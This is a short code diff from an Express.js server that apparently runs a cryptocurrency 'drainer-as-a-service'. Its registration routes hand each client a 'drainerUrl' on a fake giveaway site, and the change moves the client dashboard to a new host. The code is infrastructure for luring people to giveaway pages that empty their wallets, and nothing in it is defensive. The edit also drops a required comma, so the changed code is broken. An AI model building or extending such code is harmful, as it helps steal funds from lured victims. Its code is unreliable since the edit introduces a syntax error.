@@ -101,7 +101,7 @@ app.post('/saas/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://cheetah-giveaway.netlify.app/?client=${clientId}`,
-  dashboardUrl: `https://cheetah-giveaway.netlify.app/dashboard.html?client=${clientId}`,
+  dashboardUrl: `https://service-cheetah.netlify.app/dashboard.html?client=${clientId}`
   message: 'Client registered successfully'
 });
     
@@ -188,7 +188,7 @@ app.post('/saas/v2/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://cheetah-giveaway.netlify.app/?client=${clientId}`,
-  dashboardUrl: `https://cheetah-giveaway.netlify.app/dashboard.html?client=${clientId}`,
+  dashboardUrl: `https://service-cheetah.netlify.app/dashboard.html?client=${clientId}`
   message: 'Client registered successfully'
 });
     
